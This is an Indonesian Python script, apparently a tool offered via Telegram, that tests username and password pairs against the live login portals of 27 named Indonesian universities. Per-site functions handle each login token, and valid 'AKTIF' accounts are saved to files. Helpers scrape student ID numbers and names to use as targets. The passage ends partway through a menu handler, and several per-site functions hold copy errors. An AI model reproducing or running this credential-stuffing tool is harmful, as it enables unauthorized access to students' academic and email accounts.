import requests as req
from bs4 import BeautifulSoup as bs
import urllib.parse
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor as PoolExecutor
from concurrent.futures import ThreadPoolExecutor 
import concurrent.futures
import os, time, platform, hashlib, json, sys
import concurrent.futures
try:
	import requests as req
	from bs4 import BeautifulSoup as bs
except:
	os.system('pip install --upgrade pip')
	os.system('pip install requests bs4')
	os.system('clear')
	exit('Install Bahan Selesai\nSilahkan Restart Script')
else:
	GR = '\x1b[33;30;1m'
	R = '\x1b[33;31;1m'
	G = '\x1b[33;32;1m'
	Y = '\x1b[33;33;1m'
	BL = '\x1b[33;34;1m'
	P = '\x1b[33;35;1m'
	B = '\x1b[33;36;1m'
	W = '\x1b[33;37;1m'
	W2 = '\x1b[33;37;1m'
	W3 = '\x1b[33;31;1m'
	C = '\x1b[33;34;1m'
	C2 = '\x1b[33;36;1m'
	off = '\x1b[m'
	rv = platform.uname()
	me = rv.release
	aktif = []
	modar = []
	alumni = []
	gantipw = []
	lulus = []
	result = []
	xtc = []
	yxc = []
	

def main():
	os.system('clear')
	gerak(f"{C}⟐•─────────────────────────────────────{C}•⟐ \n",0.0000001)
	gerak(f"{C}|{C}[{W}!{C}] {W}𝚃𝚘𝚘𝚕𝚜  : 𝚂𝚌𝚊𝚗𝚗𝚎𝚛 𝚄𝚗𝚒𝚟𝚎𝚛𝚜𝚒𝚝𝚊𝚜  {off}     {C}| \n",0.0000001)
	gerak(f"{C}|{C}[{W}√{C}] {W}𝚃𝚎𝚕𝚎   : https://t.me/Akbar218   {off}  {C}| \n",0.0000001)
	gerak(f"{C}⟐•─────────────────────────────────────{C}•⟐ \n",0.0000001)
	gerak(f"{C}|[{W}01{C}]{W3}➣ {W}SCAN FORLAP                      {C}| \n",0.0000001)
	gerak(f"{C}|[{W}02{C}]{W3}➣ {W}SCAN UB                          {C}| \n",0.0000001)
	gerak(f"{C}|[{W}03{C}]{W3}➣ {W}SCAN UPI                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}04{C}]{W3}➣ {W}SCAN UAJY                        {C}| \n",0.0000001)
	gerak(f"{C}|[{W}05{C}]{W3}➣ {W}SCAN IPB                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}06{C}]{W3}➣ {W}SCAN ITB                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}07{C}]{W3}➣ {W}SCAN UI                          {C}| \n",0.0000001)
	gerak(f"{C}|[{W}08{C}]{W3}➣ {W}SCAN UNSYIAH                     {C}| \n",0.0000001)
	gerak(f"{C}|[{W}09{C}]{W3}➣ {W}SCAN UNUSA                       {C}| \n",0.0000001)
	gerak(f"{C}|[{W}10{C}]{W3}➣ {W}SCAN MERCU                       {C}| \n",0.0000001)
	gerak(f"{C}|[{W}11{C}]{W3}➣ {W}SCAN USD                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}12{C}]{W3}➣ {W}SCAN UNTAN                       {C}| \n",0.0000001)
	gerak(f"{C}|[{W}13{C}]{W3}➣ {W}SCAN UGM                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}14{C}]{W3}➣ {W}SCAN UNS                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}15{C}]{W3}➣ {W}SCAN GUNADARMA                   {C}| \n",0.0000001)
	gerak(f"{C}|[{W}16{C}]{W3}➣ {W}SCAN UINM                        {C}| \n",0.0000001)
	gerak(f"{C}|[{W}17{C}]{W3}➣ {W}SCAN UNILA                       {C}| \n",0.0000001)
	gerak(f"{C}|[{W}18{C}]{W3}➣ {W}SCAN USU                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}19{C}]{W3}➣ {W}SCAN TEKNOKRAT                   {C}| \n",0.0000001)
	gerak(f"{C}|[{W}20{C}]{W3}➣ {W}SCAN UNY                         {C}| \n",0.0000001)
	gerak(f"{C}|[{W}21{C}]{W3}➣ {W}SCAN UNIKOM                      {C}| \n",0.0000001)
	gerak(f"{C}|[{W}22{C}]{W3}➣ {W}SCAN UKDW                        {C}| \n",0.0000001)
	gerak(f"{C}|[{W}23{C}]{W3}➣ {W}SCAN UMSIDA                      {C}| \n",0.0000001)
	gerak(f"{C}|[{W}24{C}]{W3}➣ {W}SCAN UINSUKA                     {C}| \n",0.0000001)
	gerak(f"{C}|[{W}25{C}]{W3}➣ {W}SCAN POLINEMA                    {C}| \n",0.0000001)
	gerak(f"{C}|[{W}26{C}]{W3}➣ {W}SCAN UNAIR                       {C}| \n",0.0000001)
	gerak(f"{C}|[{W}27{C}]{W3}➣ {W}SCAN UM                          {C}| \n",0.0000001)
	gerak(f"{C}⟐•─────────────────────────────────────•⟐ \n",0.0000001)
	gerak(f"{C}|{W} Jangan Maruk !!!                      {C}| \n",0.00000001)
	gerak(f"{C}|{W} Fast Scanner !!!                      {C}| \n",0.00000001)
	gerak(f"{C}⟐•─────────────────────────────────────•⟐ \n",0.0000001)
	select = input(f"\n{C}[{W}?{C}]{W} Pilih : ")
	if select == '1':
			grab()
	elif select == '2':
			xub()
	elif select == '3':
			xupi()
	elif select == '4':
			xuajy()
	elif select == '5':
			xipb()
	elif select == '6':
			xitb()
	elif select == '7':
			xui()
	elif select == '8':
			xunsyiah()
	elif select == '9':
			xunusa()
	elif select == '10':
			xmercu()
	elif select == '11':
			xusd()
	elif select == '12':
			xuntan()
	elif select == '13':
			xugm()
	elif select == '14':
			xuns()
	elif select == '15':
			xgundar()
	elif select == '16':
			xuinm()
	elif select == '17':
			xunila()
	elif select == '18':
			xusu()
	elif select == '19':
			xteknokrat()
	elif select == '20':
			xuny()
	elif select == '21':
			xunikom()
	elif select == '22':
			xukdw()
	elif select == '23':
			xumsida()
	elif select == '24':
			xuinsuka()
	elif select == '25':
			xpolinema()
	elif select == '26':
			xunair()
	elif select == '27':
			xum()
		

def simpan():
	print("")
	gerak(f"{C}[{W}!{C}] {W}Scan Telah Selesai ! \n",0.001)
	gerak(f"{C}[{W}+{C}]{W}{C} [{G}AKTIF{C}] {W}: {G}{len(aktif)}\n",0.001)
	gerak(f"{C}[{W}-{C}]{W}{C} [{R}MODAR{C}] {W}: {R}{len(modar)}\n",0.001)
	gerak(f"{C}[{W}+{C}]{W} Akun Aktif Telah Tersimpan\n",0.001)
	gerak(f"{C}[{W}√{C}]{W} Telegram :{W} @Akbar218\n",0.001)
	print("")
	print(f"\r{C}[{W}1{C}]{W} Kembali Scan")
	print(f"\r{C}[{W}2{C}]{W} Exit")
	keluar = input(f"\n{C}[{W}?{C}]{W} Pilih : {W}")
	if keluar == "1":
	    main()
	elif keluar == "2":
	    exit()
	
def simpan2():
	print("")
	gerak(f"{C}[{W}!{C}] {W}Scan Telah Selesai ! \n",0.001)
	gerak(f"{C}[{W}+{C}]{W}{C} [{G}AKTIF{C}] {W}: {G}{len(aktif)}\n",0.001)
	gerak(f"{C}[{W}-{C}]{W}{C} [{R}MODAR{C}] {W}: {R}{len(modar)}\n",0.001)
	gerak(f"{C}[{W}+{C}]{W} Akun Aktif Telah Tersimpan\n",0.001)
	gerak(f"{C}[{W}√{C}]{W} Telegram :{W} @Akbar218\n",0.001)
	print("")
	print(f"\r{C}[{W}1{C}]{W} Kembali Scan")
	print(f"\r{C}[{W}2{C}]{W} Exit")
	keluar = input(f"\n{C}[{W}?{C}]{W} Pilih : {W}")
	if keluar == "1":
	    main()
	elif keluar == "2":
	    exit()
        
		
def ub(i,usr, pwd):
	ses = req.Session()
	url = 'https://vlm2.ub.ac.id/login/index.php'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dtx = { 'anchor':tok[2]['value'], 'logintoken':tok[1]['value'], 'username':usr, 'password':pwd, 'rememberusername':'1', 'submit':'Masuk' }
	post = bs(ses.post(url, data=dtx).text, 'html.parser').text
	if "Virtual Learning Management Universitas Brawijaya: Log in to the site" in post:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('aktif_ub.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def upi(i,usr, pwd):
	ses = req.Session()
	url = 'https://sso.upi.edu/cas/login?service=https%3A%2F%2Fstudent.upi.edu%2Fhome'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	hdr = { 'Host': 'sso.upi.edu', 'Connection': 'keep-alive', 'Content-Length': '30', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'http://sso.upi.edu', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://sso.upi.edu/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4'}
	dat = { 'username':usr, 'password':pwd, 'execution': tok[2]['value'], '_eventId':'submit', 'submit':'login'}
	post = bs(ses.post(url, data=dat, headers=hdr).text, 'html.parser').text
	if "Unauthenticated." in post:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('aktif_upi.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
		
def uajy(i,usr, pwd):
	url = 'https://sikma.uajy.ac.id/Account/Login'
	ses = req.Session()
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { '__RequestVerificationToken': tok[4]['value'], 'username':usr, 'password':pwd, 'submit':'submit' }
	post = ses.post(url,data=dat).text
	if "Dashboard - SIKMA" in post:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('aktif_uajy.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
			
def ipb(i,usr, pwd):
	ses = req.Session()
	url = 'https://simak.ipb.ac.id/account/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { '__RequestVerificationToken':tok[0]['value'], 'UserName':usr, 'Password':pwd, 'submit':'submit' }
	post = ses.post(url, data=dat)
	if "Beranda | Sistem Informasi Akademik IPB" in post.text:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('aktif_ipb.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
		
def itb(i, usr, pwd):
	ses = req.Session()
	url = 'https://login.itb.ac.id/cas/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	h = {'Host': 'login.itb.ac.id', 'Connection': 'keep-alive', 'Content-Length': '30', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'http://login.itb.ac.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://login.itb.ac.id/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4'}
	dtx = { 'logintoken':tok[1]['value'], 'username':usr, 'password':pwd, 'execution':tok[2]['value'], '_eventId':'submit', 'submit':'login', 'warn':'true' }
	post = ses.post(url, data=dtx, headers=h).text
	if "Login - SSO ITB" in post:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('aktif_itb.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
		
def ui(i, usr, pwd):
	ses = req.Session()
	url = 'https://sso.ui.ac.id/cas/login;jsessionid=C912A79C8D29A1DC8BB38587127D4B9B'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	h = {'Host': 'sso.ui.ac.id', 'Connection': 'keep-alive', 'Content-Length': '30', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'http://sso.ui.ac.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://sso.ui.ac.id/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4'}
	dat = { 'username':usr, 'password':pwd, 'lt':tok[2]['value'], 'execution':tok[3]['value'], '_eventId':'submit', 'login':'submit' }
	post = ses.post(url, data=dat, headers=h).text
	if "Log In Successful" in post:
	  print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
	  aktif.append(f"{usr}:{pwd}")
	  with open('aktif_upi.txt', 'a') as (save):
		  save.write(f"{usr}:{pwd}\n")
	else:
	   print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
	   modar.append(f"{usr}:{pwd}")
	
def unsyiah(i,usr, pwd):
	ses = req.Session()
	url = 'https://simkuliah.unsyiah.ac.id/'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'submit':'submit' }
	post = ses.post(url, data=dat)
	if "Username atau Password Anda salah.." in post.text:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('aktif_unsyiah.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def unusa(i,usr, pwd):
	ses = req.Session()
	url = 'https://esorogan.unusa.ac.id/index.php/login/do_login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	h = { 'User-Agent': 'Mozilla/5.0' }
	dat = { 'nipm':usr, 'passwd':pwd, 'simpan_pw':'true', 'submit':'login' }
	post = ses.post(url, data=dat)
	if "Maaf, Username atau Password Anda salah!" in post.text:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('aktif_unusa.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
		
def mercu(i,usr, pwd):
	ses = req.Session()
	url = 'https://sia.mercubuana.ac.id/gate.php/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'act':'login', 'username':usr, 'password':pwd, 'submit':'login' }
	post = ses.post(url, data=dat).text
	if "SIM Akademik Universitas Mercubuana  - Halaman Utama" in post:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('mercu_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	
def usd(i,usr, pwd):
	ses = req.Session()
	url = 'https://belajar.usd.ac.id/login/index.php'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'logintoken':tok[0]['value'], 'username':usr, 'password':pwd, 'rememberusername':'1', 'submit':'submit' }
	post = ses.post(url, data=dat).text
	if "Dashboard" in post:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('usd_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
		
def untan(i,usr, pwd):
	ses = req.Session()
	url = 'http://mahasiswa.siakad.untan.ac.id/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'nim':usr, 'password':pwd, 'submit':'submit' }
	post = ses.post(url, data=dat).text
	if "Informasi SIAKAD" in post:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('untan_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def ugm(i,usr, pwd):
	ses = req.Session()
	url = 'https://sso.ugm.ac.id/cas/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'warn':'true', 'rememberMe':'true', 'lt':tok[4]['value'], '_eventId':'submit', 'Login':'submit' }
	post = ses.post(url, data=dat).text
	if "Single Sign On" in post:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('ugm_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def uns(i,usr, pwd):
	ses = req.Session()
	url = 'https://sso.uns.ac.id/module.php/core/loginuserpass.php?AuthState=_9a80505a52911743028b4e1c6dbb624dc364cbc0df%3Ahttps%3A%2F%2Fsso.uns.ac.id%2Fmodule.php%2Fcore%2Fas_login.php%3FAuthId%3Ddefault-sp%26ReturnTo%3Dhttps%253A%252F%252Fsso.uns.ac.id%252Fmodule.php%252Funs%252Findex.php'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'AuthState':tok[0]['value'], 'username':usr, 'password':pwd, 'submit':'login' }
	post = ses.post(url, data=dat).text
	if "Single Sign On Universitas Sebelas Maret - Login" in post:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('uns_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")

def gundar(i,usr, pwd):
	ses = req.Session()
	url = 'https://studentsite.gunadarma.ac.id/index.php/site/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'submit':'login' }
	post = ses.post(url, data=dat)
	if "Akademik" in post.text:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('gundar_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
		
def uinm(i,usr, pwd):
	ses = req.Session()
	url = 'http://sia.uinmataram.ac.id/'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'submit':'submit' }
	post = ses.post(url, data=dat)
	if "SIAKAD UIN Mataram" in post.text:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('uinm_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def unila(i,usr, pwd):
	ses = req.Session()
	url = 'https://siakadu.unila.ac.id/gate/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'userid':usr, 'password':pwd, 'submit':'submit' }
	post = ses.post(url, data=dat)
	if "Universitas Lampung - Selamat Datang" in post.text:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('unila_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
		
def usu(i,usr, pwd):
	ses = req.Session()
	url = 'https://akun.usu.ac.id/auth/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'identity':usr, 'password':pwd, 'submit':'login' }
	post = ses.post(url, data=dat).text
	if "Close" in post:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('usu_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def teknokrat(i,usr, pwd):
	ses = req.Session()
	url = 'https://scele.teknokrat.ac.id/login/index.php'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'testcookies':'1', 'sesskey':tok[3]['value'], 'login':'submit' }
	post = ses.post(url, data=dat)
	if "Error" in post.text:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('teknokrat_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def uny(i,usr, pwd):
	ses = req.Session()
	url = 'https://sso.uny.ac.id/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'execution':tok[2]['value'], '_eventId':'submit', 'submit':'login' }
	post = ses.post(url, data=dat)
	if "Login - Single Sign On UNY" in post.text:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('uny_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def unikom(i,usr, pwd):
	ses = req.Session()
	url = 'https://mahasiswa.unikom.ac.id/login'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'submit':'login' }
	post = ses.post(url, data=dat)
	if "Login" in post.text:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('unikom_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def ukdw(i,usr, pwd):
	ses = req.Session()
	url = 'https://ssat.ukdw.ac.id/'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'uname':usr, 'pword':pwd, 'submit':'submit' }
	post = ses.post(url, data=dat)
	if "S.S.A.T" in post.text:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('ukdw_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
		
def umsida(i,usr, pwd):
	ses = req.Session()
	url = 'https://sim.umsida.ac.id/#'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	h = {'Host': 'sim.umsida.ac.id', 'Connection': 'keep-alive', 'Content-Length': '30', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'http://sim.umsida.ac.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://sim.umsida.ac.id/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4'}
	dat = { 'username':usr, 'password':pwd, 'lgndim':tok[2]['value'], 'submit':'login' }
	post = bs(ses.post(url, data=dat, headers=h).text, 'html.parser').text
	if "Quote" in post:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('aktif_umsida.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")
			
def uinsuka(i,usr, pwd):
	ses = req.Session()
	url = 'https://mail.uin-suka.ac.id/'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'username':usr, 'password':pwd, 'login':'masuk'}
	post = bs(ses.post(url, data=dat).text, 'html.parser').text
	if "Loading..." in post:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('uinsuka_aktif.txt', 'a') as save:
		    save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
		
def polinema(i,usr, pwd):
	ses = req.Session()
	url = 'http://siakad.umpalangkaraya.ac.id/login.html'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	h = {'Host': 'siakad.umpalangkaraya.ac.id', 'Connection': 'keep-alive', 'Content-Length': '30', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Origin': 'http://siakad.polinema.ac.id', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Referer': 'http://siakad.polinema.ac.id/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'id-ID,id;q=0.8,en-US;q=0.6,en;q=0.4'}
	dat = { 'username':usr, 'password':pwd, 'submit':'login'}
	post = bs(ses.post(url, data=dat, headers=h, timeout=10, verify=False).text, 'html.parser').text
	if "ok" in post:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('polinema_aktif', 'a') as save:
		    save.write(f"{usr}:{pwd}\n")
	else:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")

def unair(i,usr, pwd):
	ses = req.Session()
	url = 'https://cybercampus.unair.ac.id/login.php'
	tok = bs(ses.get(url).text, 'html.parser').findAll('input')
	dat = { 'mode':'login', 'username':usr, 'password':pwd, 'submit':'login'}
	post = bs(ses.post(url, data=dat).text, 'html.parser').text
	if "Universitas Airlangga Cyber Campus" in post:
		print(f"{C}[{R}MODAR{C}]{W2}-> {R}{usr}{C}:{R}{pwd}")
		modar.append(f"{usr}:{pwd}")
	else:
		print(f"{C}[{G}AKTIF{C}]{W2}-> {G}{usr}{C}:{G}{pwd}")
		aktif.append(f"{usr}:{pwd}")
		with open('unair_aktif.txt', 'a') as (save):
			save.write(f"{usr}:{pwd}\n")


def gerak(z, t):
    for e in z:
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(t)
        
def stat(u):
	x = bs(req.get(u,verify=False).text,'html.parser').findAll('div',{'class':'pagination'})[0].findAll('a')[1]['href']
	z = int(x.split('/')[7:][0])//20
	return z

def collect(u):
	raw = bs(req.get(u,verify=False).text,'html.parser').find('table').findAll('tr')
	for i in range(len(raw)-1):
		dat = raw[i+1].findAll('td')
		yxc.append({'nim': dat[1].text.replace(" ",""), 'nama' : dat[2].text})

def cut(x):
	_ = x.split('/')[:7]
	_ = f'{_[0]}/{_[1]}/{_[2]}/{_[3]}/{_[4]}/{_[5]}/{_[6]}/'
	return _
	
			
def xub():
		path = input(f"{C}[{W}+{C}]{W} Input File {W}: ")
		with open(path, 'r') as (file):
			lines = file.readlines()
